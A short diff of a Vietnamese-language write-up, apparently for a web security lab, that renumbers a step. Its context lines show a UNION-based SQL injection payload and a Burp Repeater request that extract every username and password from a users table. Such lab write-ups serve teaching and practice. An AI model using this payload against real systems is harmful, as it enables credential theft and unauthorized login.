@@ -48,7 +48,7 @@ Trích xuất tất cả username và password sau đó đăng nhập với tài
     'UNION SELECT NULL, username || '~' || password FROM users--
     ```
 
-1. **Khai thác (Exploitation)**
+3. **Khai thác (Exploitation)**
 - Gửi payload qua Burp Repeater:
     ```
     GET /filter?category=Gifts'UNION+SELECT+NULL,+username+||+'~'+||+password+FROM+users-- HTTP/2
